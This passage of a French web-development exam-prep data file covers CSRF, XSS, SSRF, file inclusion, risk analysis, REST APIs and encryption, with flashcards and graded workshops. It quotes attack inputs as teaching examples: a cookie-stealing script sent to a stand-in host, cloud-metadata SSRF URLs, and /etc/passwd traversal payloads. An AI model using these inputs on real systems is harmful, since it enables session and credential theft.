    <li><strong>Déconnexion</strong> : <code>$_SESSION = []</code>, <code>session_destroy()</code>, et invalidation du cookie. Vider seulement la variable laisse la session vivante côté serveur.</li>
  </ul>

  <h2>5. Clickjacking</h2>
  <p>Le site victime est chargé dans une <code>iframe</code> transparente, superposée à un bouton attractif. La victime croit cliquer sur "Gagner un bon d'achat", elle clique en réalité sur "Supprimer mon compte".</p>
  <ul>
    <li><code>X-Frame-Options: DENY</code> (ou <code>SAMEORIGIN</code>) : le site refuse d'être encadré.</li>
    <li>Équivalent moderne : <code>Content-Security-Policy: frame-ancestors 'none'</code>.</li>
    <li>Ce n'est pas une faille du code métier : c'est un défaut de configuration HTTP.</li>
  </ul>

  <h2>6. SSRF : Server-Side Request Forgery</h2>
  <p>Le site propose une fonction qui va chercher une URL (import d'image, webhook, aperçu de lien). L'attaquant fournit une URL interne :</p>
  <pre class="codeblock"><code class="lang-text">http://127.0.0.1:8080/admin
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://10.0.0.12:3306</code></pre>
  <p>Le serveur, lui, est <em>derrière</em> le pare-feu : il peut joindre ce que l'attaquant ne peut pas joindre. <code>169.254.169.254</code> est l'adresse de métadonnées des clouds, elle rend des jetons d'identité. Parade : <strong>liste blanche</strong> de domaines et de schémas autorisés, pas une blacklist d'IP (il y a toujours une notation alternative ou une redirection).</p>

  <h2>7. Traversée de répertoire et inclusion de fichier</h2>
  <pre class="codeblock"><code class="lang-text">index.php?page=../../../../etc/passwd
index.php?page=php://filter/convert.base64-encode/resource=config</code></pre>
  <p>Parade : <code>basename()</code> sur le paramètre, puis <strong>liste blanche</strong> des pages autorisées, et <code>realpath()</code> vérifié comme préfixé par le dossier attendu. Un simple <code>str_replace('../', '')</code> se contourne avec <code>....//</code>.</p>

  <h2>8. Upload de fichier</h2>
  <ul>
    <li>Vérifier l'extension <em>et</em> le type réel (<code>finfo</code>), pas seulement l'en-tête <code>Content-Type</code> envoyé par le client.</li>
    <li>Renommer le fichier côté serveur (identifiant aléatoire), ne jamais réutiliser le nom fourni.</li>
    <li>Stocker <strong>hors</strong> de la racine web : un <code>.php</code> uploadé dans un dossier servi exécute du code.</li>
    <li>Retirer le droit d'exécution sur le dossier de dépôt.</li>
  </ul>

  <h2>9. Les en-têtes de sécurité (5 lignes à retenir)</h2>
  <pre class="codeblock"><code class="lang-text">Content-Security-Policy      limite les sources de scripts, donc reduit l'impact d'un XSS
Strict-Transport-Security    le navigateur refuse le HTTP pendant max-age (HSTS)
X-Content-Type-Options       nosniff : pas d'interpretation devinee du type
X-Frame-Options              DENY / SAMEORIGIN contre le clickjacking
Referrer-Policy              limite les fuites d'URL vers les sites tiers</code></pre>
  <div class="callout callout--key">
    <span class="callout__label">Formulation qui rapporte</span>
    <p>"Le pare-feu ne protège pas de cette attaque : la requête est légitime au niveau réseau. La correction est applicative." Cette phrase vaut souvent plus que trois lignes de code.</p>
  </div>

  <h2>10. Ce qu'on peut te demander</h2>
  <ul>
    <li>Lire un formulaire et dire si un jeton anti-CSRF est présent, et où il doit être vérifié.</li>
    <li>Dire pourquoi <code>/supprimer?id=42</code> en <code>GET</code> est dangereux, même avec une confirmation JavaScript.</li>
    <li>Corriger un <code>echo $donnees</code> et préciser le contexte d'échappement.</li>
    <li>Classer un scénario dans la bonne famille d'attaque et nommer une parade.</li>
    <li>Expliquer pourquoi <code>htmlspecialchars()</code> ne protège pas d'une injection SQL, et l'inverse.</li>
  </ul>
  `,
  cards: [
    { id: "w1", q: "CSRF : pourquoi l'attaquant n'a-t-il pas besoin de lire la réponse ?", a: "Parce que le navigateur joint <strong>automatiquement</strong> le cookie de session à toute requête vers le site. Il suffit de déclencher l'action : l'effet se produit avec les droits de la victime, sans jamais voir le résultat." },
    { id: "w2", q: "CSRF ou XSS : lequel vole un mot de passe ?", a: "<strong>Ni l'un ni l'autre directement.</strong> CSRF exploite une session déjà ouverte sans rien voler. XSS peut voler le <em>cookie de session</em> (si non HttpOnly), donc l'accès, mais pas le mot de passe." },
    { id: "w3", q: "Comment se défend-on d'un CSRF ?", a: "Jeton aléatoire généré côté serveur (<code>random_bytes</code>), stocké en <code>$_SESSION</code>, inséré en champ caché, puis comparé à la soumission avec <code>hash_equals()</code>. En complément : <code>SameSite</code> et jamais d'action en <code>GET</code>." },
    { id: "w4", q: "Un cookie <code>SameSite=Strict</code> suffit-il contre le CSRF ?", a: "<strong>Non.</strong> C'est une défense en profondeur, pas la correction. Le jeton en session reste la réponse attendue, car <code>SameSite</code> dépend du navigateur et du domaine." },
    { id: "w5", q: "Pourquoi <code>/supprimer?id=42</code> est-il une faille CSRF ?", a: "Parce qu'un <code>GET</code> qui modifie l'état peut être déclenché par une simple image ou un lien. Un <code>GET</code> doit être idempotent et sans effet de bord ; la suppression doit passer par un <code>POST</code> protégé par jeton." },
    { id: "w6", q: "XSS stocké contre XSS reflété : quelle différence ?", a: "Stocké : le payload est <strong>enregistré en base</strong> et servi à tous les visiteurs (le plus grave). Reflété : il vient de l'URL et n'affecte que celui qui clique. DOM : il est manipulé uniquement par le JavaScript client." },
    { id: "w7", q: "Où faut-il échapper contre un XSS ?", a: "<strong>À l'affichage</strong>, avec <code>htmlspecialchars($v, ENT_QUOTES, 'UTF-8')</code>. Pas à l'entrée : on garderait des données dégradées en base et on raterait les autres contextes de sortie (attribut, JSON, JS)." },
    { id: "w8", q: "À quoi sert <code>HttpOnly</code> ?", a: "Le cookie devient inaccessible à <code>document.cookie</code>. Un XSS ne peut donc plus lire le cookie de session. Ça n'empêche pas l'attaque, ça annule le vol de session." },
    { id: "w9", q: "Quelle fonction PHP empêche la fixation de session ?", a: "<code>session_regenerate_id(true)</code>, appelée juste après l'authentification réussie. L'identifiant imposé avant le login devient inutilisable." },
    { id: "w10", q: "Clickjacking : mécanisme et header ?", a: "Le site est chargé dans une iframe transparente superposée à un bouton piégé. Parade : <code>X-Frame-Options: DENY</code> ou <code>Content-Security-Policy: frame-ancestors 'none'</code>." },
    { id: "w11", q: "Un site importe des images depuis une URL fournie. Quelle attaque et quelle parade ?", a: "<strong>SSRF</strong> : l'attaquant vise <code>127.0.0.1</code>, le réseau interne ou <code>169.254.169.254</code> (métadonnées cloud). Parade : liste blanche de domaines et de schémas, pas une blacklist d'IP." },
    { id: "w12", q: "Comment sécuriser <code>include $_GET['page']</code> ?", a: "<code>basename()</code> puis <strong>liste blanche</strong> des pages autorisées, et <code>realpath()</code> vérifié comme préfixé par le dossier attendu. Un <code>str_replace('../','')</code> se contourne." },
    { id: "w13", q: "Trois règles pour un upload de fichier ?", a: "Vérifier l'extension <em>et</em> le type réel avec <code>finfo</code>, renommer côté serveur, stocker hors de la racine web avec exécution PHP désactivée." },
    { id: "w14", q: "Un clic sur un lien piégé peut-il être bloqué par le pare-feu ?", a: "<strong>Non.</strong> La requête est légitime au niveau réseau. Seule une mesure applicative la bloque : jeton anti-CSRF, échappement, liste blanche. Le pare-feu ne lit pas le contenu." }
  ],
  ateliers: [
    {
      id: "at-csrf-token",
      title: "Ajoute le jeton anti-CSRF au formulaire",
      lang: "php",
      prompt: `<p>Ce formulaire de virement n'a aucune protection CSRF :</p>
      <pre class="codeblock"><code class="lang-php">session_start();
?&gt;
&lt;form method="post" action="virement.php"&gt;
  &lt;input type="text" name="montant"&gt;
  &lt;button type="submit"&gt;Valider&lt;/button&gt;
&lt;/form&gt;</code></pre>
      <p>Complète le script : génération du jeton, champ caché dans le formulaire, vérification côté serveur. Utilise <code>random_bytes</code> et <code>hash_equals</code>.</p>`,
      starter: `session_start();

// 1. Jeton

// 2. Verification si POST

`,
      model: `session_start();

// 1. Jeton genere une seule fois par session
if (empty($_SESSION['csrf'])) {
    $_SESSION['csrf'] = bin2hex(random_bytes(32));
}
$jeton = $_SESSION['csrf'];

// 2. Verification si POST, en temps constant
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!isset($_POST['csrf']) || !hash_equals($_SESSION['csrf'], $_POST['csrf'])) {
        http_response_code(403);
        exit('Jeton invalide');
    }
    // traitement du virement
}
?>
<form method="post" action="virement.php">
  <input type="hidden" name="csrf" value="<?= htmlspecialchars($jeton, ENT_QUOTES, 'UTF-8') ?>">
  <input type="text" name="montant">
  <button type="submit">Valider</button>
</form>`,
      checks: [
        { label: "Jeton aléatoire généré côté serveur", test: /random_bytes\s*\(|bin2hex\s*\(/i },
        { label: "Jeton stocké en session", test: /\$_SESSION\s*\[\s*['"]csrf['"]\s*\]/ },
        { label: "Champ caché dans le formulaire", test: /<input[^>]+name\s*=\s*["']?csrf/i },
        { label: "Comparaison avec hash_equals", test: /hash_equals\s*\(/i },
        { label: "Rejet de la requête (403 ou exit)", test: /403|http_response_code|exit\s*\(|die\s*\(/i }
      ]
    },
    {
      id: "at-xss-echap",
      title: "Corrige l'affichage d'un commentaire",
      lang: "php",
      prompt: `<p>Ce code affiche un commentaire saisi par un utilisateur. Un visiteur écrit <code>&lt;script&gt;fetch('https://x.fr?c='+document.cookie)&lt;/script&gt;</code>.</p>
      <pre class="codeblock"><code class="lang-php">$commentaire = $_POST['commentaire'];
echo "&lt;p&gt;" . $commentaire . "&lt;/p&gt;";
echo "&lt;div title=\\"" . $commentaire . "\\"&gt;commentaire&lt;/div&gt;";</code></pre>
      <p>Réécris l'affichage. Échappe au bon endroit, avec les bons paramètres.</p>`,
      starter: `$commentaire = $_POST['commentaire'];

`,
      model: `$commentaire = $_POST['commentaire'];

// Echappement a l'affichage, jamais a l'entree
$sur = htmlspecialchars($commentaire, ENT_QUOTES, 'UTF-8');

echo '<p>' . $sur . '</p>';

// Dans un attribut, ENT_QUOTES est obligatoire
echo '<div title="' . $sur . '">commentaire</div>';`,
      checks: [
        { label: "htmlspecialchars utilisé", test: /htmlspecialchars\s*\(/i },
        { label: "ENT_QUOTES présent", test: /ENT_QUOTES/ },
        { label: "Encodage UTF-8 explicite", test: /UTF-8|UTF8/i },
        { label: "Plus aucun echo de la variable brute", test: /^(?![\s\S]*echo[^;]*\.\s*\$commentaire\s*\.)/i }
      ]
    },
    {
      id: "at-attaques-tri",
      title: "Nomme l'attaque et la parade",
      lang: "text",
      prompt: `<p>Pour chaque scénario : le nom de la famille d'attaque, et une parade concrète.</p>
      <ol>
        <li>Un lien <code>http://site.fr/admin/supprimer?id=12</code> est envoyé par mail à un administrateur connecté ; la ligne disparaît.</li>
        <li>Un visiteur poste un commentaire contenant <code>&lt;script&gt;</code> ; tous les lecteurs de la page exécutent le script.</li>
        <li>Le module d'aperçu d'image accepte <code>http://169.254.169.254/latest/meta-data/</code> et affiche la réponse.</li>
        <li>Le paramètre <code>?page=../../../../etc/passwd</code> affiche le contenu du fichier.</li>
        <li>Le site est encadré dans une iframe invisible sur un site tiers ; la victime valide un paiement.</li>
      </ol>`,
      starter: `1.
`,
      model: `1. CSRF : le GET supprime sans jeton. Parade : POST + jeton en session compare avec hash_equals, jamais d'action en GET.
2. XSS stocke : le payload est enregistre en base et servi a tous. Parade : htmlspecialchars($v, ENT_QUOTES, 'UTF-8') a l'affichage, cookie HttpOnly, CSP.
3. SSRF : le serveur joint le reseau interne et les metadonnees cloud. Parade : liste blanche de domaines et de schemas.
4. Traversee de repertoire / LFI : lecture arbitraire de fichiers. Parade : basename(), liste blanche de pages, realpath verifie.
5. Clickjacking : clic detourne via iframe. Parade : X-Frame-Options DENY ou CSP frame-ancestors 'none'.`,
      checks: [
        { label: "CSRF identifié avec jeton comme parade", test: /csrf[\s\S]{0,300}jeton|jeton[\s\S]{0,300}csrf/i },
        { label: "XSS identifié avec échappement", test: /xss[\s\S]{0,300}htmlspecialchars|htmlspecialchars[\s\S]{0,300}xss/i },
        { label: "SSRF identifié avec liste blanche", test: /ssrf/i },
        { label: "Traversée identifiée (basename / realpath)", test: /travers|basename|realpath|lfi/i },
        { label: "Clickjacking identifié (X-Frame-Options ou frame-ancestors)", test: /x-frame-options|frame-ancestors|clickjacking/i }
      ]
    }
  ]
},

/* ============================== 09 ============================== */
{
  id: "09-risques",
  num: "10",
  title: "Analyse de risques",
  tag: "4 sujets sur 9",
  hot: false,
  intro: "Souvent 15 points faciles si tu suis la chaîne logique. Le barème suit exactement cette chaîne.",
  cours: `
  <h2>1. La chaîne logique (tout le barème)</h2>
  <pre class="codeblock"><code class="lang-text">Actif -> Source de risque -> Evenement redoute -> Impact -> Mesure de securite</code></pre>
  <ul>
    <li><strong>Actif</strong> : ce qu'on protège (base clients, site, serveur, réputation).</li>
    <li><strong>Source de risque</strong> : qui ou quoi menace (cybercriminel, ancien salarié, erreur humaine, incendie).</li>
    <li><strong>Événement redouté</strong> : ce qui arrive à l'actif (fuite, indisponibilité, corruption).</li>
    <li><strong>Impact</strong> : financier, juridique (RGPD), réputationnel, opérationnel.</li>
    <li><strong>Mesure</strong> : ce qu'on met en place, technique, organisationnelle ou humaine.</li>
  </ul>

  <h2>2. Vraisemblance et gravité</h2>
  <table class="tbl">
    <caption>Matrice de risque, échelle 1 à 4</caption>
    <thead><tr><th></th><th>Gravité faible</th><th>Gravité moyenne</th><th>Gravité forte</th><th>Gravité critique</th></tr></thead>
    <tbody>
      <tr><td><strong>Vraisemblance forte</strong></td><td>moyen</td><td>élevé</td><td>critique</td><td>critique</td></tr>
      <tr><td><strong>Vraisemblance moyenne</strong></td><td>faible</td><td>moyen</td><td>élevé</td><td>critique</td></tr>
      <tr><td><strong>Vraisemblance faible</strong></td><td>faible</td><td>faible</td><td>moyen</td><td>élevé</td></tr>
    </tbody>
  </table>
  <p>Ce que le correcteur attend : que tu <strong>positionnes</strong> le scénario et que tu <strong>justifies</strong> le positionnement en une phrase. Exemple : "vraisemblance forte car l'attaquant n'a besoin que d'un navigateur, gravité forte car des données de santé sont concernées".</p>

  <h2>3. Les 4 types de mesures</h2>
  <ol>
    <li><strong>Préventive</strong> : empêche l'événement (pare-feu, chiffrement, formation, politique de mot de passe).</li>
    <li><strong>Détective</strong> : le détecte (journalisation, IDS, supervision, audit).</li>
    <li><strong>Corrective</strong> : limite l'impact (sauvegarde, plan de reprise, correctif).</li>
    <li><strong>Dissuasive</strong> : décourage (charte, avertissement légal, vidéosurveillance).</li>
  </ol>

  <h2>4. Réponse type à « identifie 2 risques et les mesures »</h2>
  <h3>Risque 1, fuite de données clients</h3>
  <ul>
    <li>Source : cybercriminel extérieur</li>
    <li>Vecteur : injection SQL sur le formulaire de recherche</li>
    <li>Impact : sanction CNIL, perte de confiance</li>
    <li>Mesures : requêtes préparées (préventive), journalisation des accès (détective), notification CNIL sous 72 h (corrective)</li>
  </ul>
  <h3>Risque 2, indisponibilité du service par rançongiciel</h3>
  <ul>
    <li>Source : groupe cybercriminel</li>
    <li>Vecteur : phishing sur un poste administratif</li>
    <li>Impact : arrêt de l'activité, perte de chiffre d'affaires</li>
    <li>Mesures : sauvegardes hors ligne testées (corrective), filtrage mail et sensibilisation (préventive), EDR (détective)</li>
  </ul>

  <h2>5. Vocabulaire complémentaire</h2>
  <ul>
    <li><strong>EBIOS RM</strong> : méthode française d'analyse de risques (ANSSI), 5 ateliers.</li>
    <li><strong>PRA et PCA</strong> : plan de reprise d'activité, plan de continuité d'activité.</li>
    <li><strong>SLA, RTO, RPO</strong> : niveau de service, délai de rétablissement, perte de données acceptable.</li>
    <li><strong>Défense en profondeur</strong> : plusieurs couches indépendantes (pare-feu, droits, chiffrement, logs).</li>
  </ul>
  `,
  cards: [
    { id: "k1", q: "Récite la chaîne d'analyse de risque", a: "Actif, source de risque, événement redouté, impact, mesure de sécurité." },
    { id: "k2", q: "Les 4 types de mesures de sécurité", a: "Préventive (empêche), détective (détecte), corrective (limite l'impact), dissuasive (décourage)." },
    { id: "k3", q: "Une sauvegarde, c'est préventif ou correctif ?", a: "<strong>Correctif</strong> : elle ne sert qu'après l'incident, pour restaurer et limiter l'impact. Le chiffrement, lui, est préventif." },
    { id: "k4", q: "Comment justifier une position dans la matrice de risque ?", a: "Une phrase par axe : \"vraisemblance forte car l'attaque ne demande qu'un navigateur et aucune compétence avancée, gravité forte car des données de santé sont concernées\"." },
    { id: "k5", q: "Que signifient RTO et RPO ?", a: "RTO : délai maximal de rétablissement du service. RPO : perte de données maximale acceptable, donc fréquence de sauvegarde nécessaire." },
    { id: "k6", q: "Qu'est-ce que la défense en profondeur ?", a: "Empiler plusieurs couches de protection indépendantes (pare-feu, droits, chiffrement, journalisation) pour qu'une seule faille ne compromette pas tout." }
  ],
  ateliers: [
    {
      id: "at-chaine-risque",
      title: "Construis une chaîne de risque complète",
      lang: "text",
      prompt: `<p>Contexte : un site e-commerce stocke les données de 12 000 clients et n'a pas de sauvegarde testée. Une seule personne administre le serveur.</p>
      <p>Produis <strong>deux</strong> chaînes complètes : actif, source de risque, événement redouté, impact, mesure.</p>`,
      starter: `Risque 1\n- Actif : `,
      model: `Risque 1 : fuite de donnees clients
- Actif : base de donnees clients (nom, adresse, mail, historique d'achat)
- Source de risque : cybercriminel externe
- Evenement redoute : exfiltration de la base via une injection SQL sur la recherche produit
- Impact : juridique (notification CNIL sous 72 h, sanction possible), reputationnel, financier
- Mesures : requetes preparees (preventive), journalisation des acces (detective), notification et information des personnes (corrective)

Risque 2 : perte definitive des donnees
- Actif : base de donnees et site e-commerce
- Source de risque : panne materielle ou erreur humaine d'administration
- Evenement redoute : corruption ou suppression de la base sans sauvegarde exploitable
- Impact : arret de l'activite, perte du chiffre d'affaires, obligation de declarer la violation
- Mesures : sauvegardes 3-2-1 avec restauration testee (corrective), comptes d'administration nominatifs et moindre privilege (preventive), supervision des sauvegardes (detective)

Point cle a citer : la sauvegarde ne protege pas contre la fuite, elle protege
contre la perte. Une mesure preventive et une mesure corrective ne repondent
pas au meme evenement redoute.`,
      checks: []
    },
    {
      id: "at-mesures-classif",
      title: "Classe les mesures",
      lang: "text",
      prompt: `<p>Classe chaque mesure en préventive, détective, corrective ou dissuasive, et dis contre quoi elle protège.</p>
      <ol>
        <li>Politique de mot de passe à 12 caractères</li>
        <li>Supervision des journaux d'authentification</li>
        <li>Restauration mensuelle testée d'une sauvegarde</li>
        <li>Charte informatique signée par les salariés</li>
        <li>Pare-feu filtrant les ports entrants</li>
        <li>Filtre anti-spam sur la messagerie</li>
      </ol>`,
      starter: `1. `,
      model: `1. Preventive. Rend la devinette de mot de passe plus couteuse, donc protege
   contre la force brute et le vol d'identifiants.

2. Detective. Ne bloque rien, mais rend visible une attaque en cours
   (echecs repetes, connexions nocturnes).

3. Corrective. Limite l'impact d'un sinistre en garantissant un retour arriere
   possible. Une sauvegarde jamais restauree ne compte pas.

4. Dissuasive. Decourage le comportement fautif et donne un cadre juridique
   interne, mais n'empeche rien techniquement.

5. Preventive. Reduit la surface d'attaque reseau, ne voit pas le contenu
   applicatif (ce n'est pas un WAF).

6. Preventive. Reduit fortement le vecteur phishing, qui reste le premier
   mode d'entree des rancongiciels.`,
      checks: []
    }
  ]
},

/* ============================== 10 ============================== */
{
  id: "10-api",
  num: "11",
  title: "API REST & JSON",
  tag: "Thème montant",
  hot: false,
  intro: "Jusqu'à 53 occurrences dans les sujets 2025. Les points sont faciles : verbes, codes de statut, et cinq règles de sécurité.",
  cours: `
  <h2>1. Ce qu'est une API REST</h2>
  <p>Une <strong>API</strong> expose des fonctionnalités à d'autres programmes. <strong>REST</strong> est un style d'architecture basé sur les ressources et les verbes HTTP.</p>
  <table class="tbl">
    <caption>Verbes HTTP et idempotence</caption>
    <thead><tr><th>Verbe</th><th>Action</th><th>Idempotent</th></tr></thead>
    <tbody>
      <tr><td><code>GET</code></td><td>lire</td><td>oui</td></tr>
      <tr><td><code>POST</code></td><td>créer</td><td>non</td></tr>
      <tr><td><code>PUT</code></td><td>remplacer</td><td>oui</td></tr>
      <tr><td><code>PATCH</code></td><td>modifier partiellement</td><td>non</td></tr>
      <tr><td><code>DELETE</code></td><td>supprimer</td><td>oui</td></tr>
    </tbody>
  </table>
  <p><strong>Idempotent</strong> : rejouer la requête donne le même état final. Deux <code>POST /commandes</code> créent deux commandes. Deux <code>DELETE /client/42</code> ne suppriment qu'un client.</p>

  <h2>2. Codes de statut</h2>
  <ul>
    <li><code>200 OK</code> : succès.</li>
    <li><code>201 Created</code> : ressource créée, retour de <code>POST</code>.</li>
    <li><code>204 No Content</code> : succès sans corps, souvent <code>DELETE</code>.</li>
    <li><code>400 Bad Request</code> : requête mal formée.</li>
    <li><code>401 Unauthorized</code> : <strong>non authentifié</strong>, pas de jeton valide.</li>
    <li><code>403 Forbidden</code> : authentifié mais <strong>pas le droit</strong>.</li>
    <li><code>404 Not Found</code> : ressource inexistante.</li>
    <li><code>409 Conflict</code> : conflit, par exemple email déjà utilisé.</li>
    <li><code>429 Too Many Requests</code> : rate limiting.</li>
    <li><code>500 Internal Server Error</code> : erreur serveur.</li>
  </ul>
  <div class="callout callout--warn">
    <span class="callout__label">Piège 401 contre 403</span>
    <p>401 : "je ne sais pas qui tu es". 403 : "je sais qui tu es, tu n'as pas le droit".</p>
  </div>

  <h2>3. Un échange type</h2>
  <pre class="codeblock"><code class="lang-text">POST /api/v1/clients HTTP/1.1
Host: api.ndv.fr
Content-Type: application/json
Authorization: Bearer eyJhbGciOi...

{"nom": "Dupont", "email": "jdupont@exemple.fr"}</code></pre>
  <pre class="codeblock"><code class="lang-text">{
  "id": 42,
  "nom": "Dupont",
  "email": "jdupont@exemple.fr",
  "cree_le": "2026-10-20T10:00:00Z"
}</code></pre>
  <p>Réponse d'erreur attendue : <code>{"erreur": "champ 'email' invalide", "code": 400}</code></p>

  <h2>4. Les 5 règles de sécurité d'une API</h2>
  <ol>
    <li><strong>HTTPS obligatoire</strong>, jamais d'API en HTTP.</li>
    <li><strong>Authentification par jeton</strong> (<code>Authorization: Bearer</code>), pas de mot de passe dans l'URL.</li>
    <li><strong>Contrôle d'accès par ressource</strong> : vérifier que l'objet demandé appartient à l'appelant (IDOR).</li>
    <li><strong>Validation des entrées</strong> : schéma JSON, types, longueurs.</li>
    <li><strong>Limitation de débit et journalisation</strong> des appels.</li>
  </ol>
  <p><strong>JWT</strong> : jeton <em>signé</em> contenant des <em>claims</em> (identité, rôle, expiration). Signé, pas chiffré, donc ne jamais y mettre de donnée sensible. La signature garantit l'intégrité, <code>exp</code> limite la durée de vie.</p>

  <h2>5. Ce qu'on peut te demander</h2>
  <ul>
    <li>Identifier le verbe et l'URL d'une action décrite. "récupérer la fiche du client 42" donne <code>GET /api/clients/42</code>.</li>
    <li>Lire un JSON de réponse et en extraire une valeur.</li>
    <li>Repérer qu'un endpoint n'a pas de contrôle d'accès.</li>
    <li>Proposer le code PHP d'appel avec <code>curl</code> ou <code>file_get_contents</code> plus <code>json_decode</code>.</li>
  </ul>
  <pre class="codeblock"><code class="lang-php">$reponse = file_get_contents('https://api.ndv.fr/api/v1/clients/42', false,
    stream_context_create(['http' => [
        'header' => "Authorization: Bearer $token\r\nAccept: application/json"
    ]])
);
$client = json_decode($reponse, true);
echo htmlspecialchars($client['nom'], ENT_QUOTES, 'UTF-8');</code></pre>
  `,
  cards: [
    { id: "ap1", q: "Quels verbes HTTP sont idempotents ?", a: "<code>GET</code>, <code>PUT</code> et <code>DELETE</code>. <code>POST</code> et <code>PATCH</code> ne le sont pas." },
    { id: "ap2", q: "Différence entre 401 et 403 ?", a: "401 : non authentifié, aucun jeton valide. 403 : authentifié mais interdit, donc un problème d'habilitation." },
    { id: "ap3", q: "Quel code pour une création réussie ?", a: "<code>201 Created</code>, avec idéalement l'URL de la ressource créée dans l'en-tête <code>Location</code>." },
    { id: "ap4", q: "Quel verbe et quelle URL pour récupérer le client 42 ?", a: "<code>GET /api/clients/42</code>. La ressource est dans l'URL, le verbe porte l'action." },
    { id: "ap5", q: "Un JWT est-il chiffré ?", a: "<strong>Non, il est signé.</strong> N'importe qui peut lire son contenu en base64. La signature garantit qu'il n'a pas été modifié. Donc jamais de donnée sensible dedans." },
    { id: "ap6", q: "Les 5 règles de sécurité d'une API", a: "HTTPS, jeton Bearer, contrôle d'accès par ressource, validation des entrées, rate limiting et journalisation." },
    { id: "ap7", q: "Comment gérer un email déjà utilisé côté API ?", a: "Répondre <code>409 Conflict</code> avec un corps JSON explicite, plutôt qu'un 500 ou un 400 générique." }
  ],
  ateliers: [
    {
      id: "at-api-verbes",
      title: "Choisis verbe, URL et code de retour",
      lang: "text",
      prompt: `<p>Pour chaque action, donne le verbe, l'URL et le code de retour attendu.</p>
      <ol>
        <li>Lister les contrats du client 42</li>
        <li>Créer un nouveau client</li>
        <li>Supprimer le contrat 128</li>
        <li>Modifier uniquement l'email du client 42</li>
        <li>Un client authentifié tente de lire la facture d'un autre client</li>
      </ol>`,
      starter: `1. `,
      model: `1. GET /api/clients/42/contrats   -> 200 OK

2. POST /api/clients
   Corps JSON : nom, email      -> 201 Created (+ Location: /api/clients/43)

3. DELETE /api/contrats/128     -> 204 No Content
   (idempotent : rejouer la requete ne supprime rien de plus)

4. PATCH /api/clients/42
   Corps JSON : {"email": "nouveau@exemple.fr"}   -> 200 OK
   PUT remplacerait toute la ressource, PATCH modifie partiellement.

5. 403 Forbidden
   L'utilisateur est authentifie, mais il n'a pas le droit sur CETTE ressource.
   Un 401 signifierait qu'il n'est pas authentifie, ce qui n'est pas le cas.`,
      checks: []
    },
    {
      id: "at-api-php",
      title: "Appelle l'API en PHP et récupère le nom",
      lang: "php",
      prompt: `<p>Appelle <code>GET https://api.ndv.fr/api/v1/clients/42</code> avec un jeton Bearer, décode la réponse JSON en tableau associatif, et affiche le nom échappé pour du HTML.</p>`,
      starter: `$token = getenv('API_TOKEN');

`,
      model: `$token = getenv('API_TOKEN');

$options = [
    'http' => [
        'method'  => 'GET',
        'header'  => "Authorization: Bearer $token\r\nAccept: application/json",
        'timeout' => 5,
    ],
];

$reponse = file_get_contents(
    'https://api.ndv.fr/api/v1/clients/42',
    false,
    stream_context_create($options)
);

if ($reponse === false) {
    http_response_code(502);
    exit('Erreur appel API');
}

$client = json_decode($reponse, true);

if (!is_array($client) || !isset($client['nom'])) {
    http_response_code(502);
    exit('Reponse API invalide');
}

echo htmlspecialchars($client['nom'], ENT_QUOTES, 'UTF-8');`,
      checks: [
        { label: "Appel HTTP à l'URL de l'API", test: /https:\/\/api\.ndv\.fr\/api\/v1\/clients\/42/i },
        { label: "En-tête Authorization Bearer", test: /Authorization:\s*Bearer/i },
        { label: "Décode le JSON en tableau", test: /json_decode\s*\([^)]*,\s*true\s*\)/i },
        { label: "Échappe la sortie HTML", test: /htmlspecialchars\s*\(/i },
        { label: "Gère l'échec de l'appel", test: /===\s*false|if\s*\(\s*!\s*\$reponse/i }
      ]
    }
  ]
},

/* ============================== 11 ============================== */
{
  id: "11-chiffrement",
  num: "12",
  title: "Chiffrement, hachage & TLS",
  tag: "Ponctuel, en hausse",
  hot: false,
  intro: "AES est apparu 9 fois en 2026. Le piège est toujours le même : hacher n'est pas chiffrer.",
  cours: `
  <h2>1. Les trois notions</h2>
  <table class="tbl">
    <caption>Ne jamais mélanger</caption>
    <thead><tr><th></th><th>Réversible</th><th>Usage</th></tr></thead>
    <tbody>
      <tr><td><strong>Hachage</strong></td><td>non</td><td>vérifier un mot de passe, contrôler l'intégrité</td></tr>
      <tr><td><strong>Chiffrement symétrique</strong></td><td>oui, même clé</td><td>protéger une donnée au repos (AES)</td></tr>
      <tr><td><strong>Chiffrement asymétrique</strong></td><td>oui, paire de clés</td><td>échange de clés, signature, TLS</td></tr>
    </tbody>
  </table>
  <div class="callout callout--warn">
    <span class="callout__label">Question piège</span>
    <p>"Pour stocker les mots de passe, faut-il les chiffrer ?" <strong>Non</strong>, il faut les hacher. Un chiffrement est réversible, donc la clé devient le point faible.</p>
  </div>

  <h2>2. AES en MySQL</h2>
  <pre class="codeblock"><code class="lang-sql">-- Chiffrer a l'insertion
INSERT INTO contrat (num_secu)
VALUES (AES_ENCRYPT('185127512345678', 'cle_secrete_de_32_caracteres'));

-- Dechiffrer a la lecture
SELECT CAST(AES_DECRYPT(num_secu, 'cle_secrete_de_32_caracteres') AS CHAR) AS num_secu_clair
FROM contrat;</code></pre>
  <ul>
    <li>La sortie de <code>AES_ENCRYPT</code> est <strong>binaire</strong>, donc colonne <code>VARBINARY</code>, pas <code>VARCHAR</code>.</li>
    <li>La clé ne doit <strong>pas</strong> être en clair dans la requête SQL : elle vient de la configuration (<code>$_ENV</code>, coffre-fort de secrets), sinon elle apparaît dans les logs et le code source.</li>
    <li>Chiffrer une colonne <strong>empêche un <code>WHERE</code> ou un <code>LIKE</code> direct</strong> dessus, sauf index aveugle. C'est un compromis à mentionner.</li>
    <li>Un <code>UPDATE</code> sur une colonne chiffrée doit re-chiffrer la valeur.</li>
  </ul>

  <h2>3. TLS et HTTPS</h2>
  <ul>
    <li><strong>TLS</strong> chiffre le transport : confidentialité, intégrité, authentification du serveur via le certificat.</li>
    <li><strong>HTTPS = HTTP + TLS.</strong></li>
    <li>Protégé : le contenu en transit, contre l'écoute et la modification (homme du milieu).</li>
    <li><strong>Non protégé</strong> : les données une fois stockées côté serveur, et les métadonnées (IP, domaine visité).</li>
    <li>Le cadenas ne garantit pas que le site est honnête, seulement que la connexion est chiffrée vers ce domaine.</li>
  </ul>

  <h2>4. Bonnes pratiques</h2>
  <ul>
    <li>Jamais de clé en dur dans le code : variable d'environnement ou coffre-fort.</li>
    <li>Rotation des clés.</li>
    <li>Chiffrement au repos <strong>et</strong> en transit, c'est la défense en profondeur.</li>
    <li>Ne jamais journaliser une donnée chiffrée, ni en clair.</li>
    <li>HSTS et redirection HTTP vers HTTPS.</li>
  </ul>
  `,
  cards: [
